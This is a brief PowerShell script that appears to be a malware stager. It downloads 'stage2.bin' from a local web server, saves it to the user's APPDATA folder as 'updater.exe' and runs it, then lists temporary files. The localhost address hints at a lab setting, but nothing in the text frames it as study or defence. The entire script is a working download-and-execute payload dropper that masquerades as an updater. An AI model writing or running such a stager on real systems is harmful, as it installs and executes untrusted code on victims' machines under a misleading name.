[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://localhost:8081/cdn/stage2.bin',
    [string]$LocalPath = "$env:APPDATA\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $LocalPath)
Start-Process -FilePath $LocalPath
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
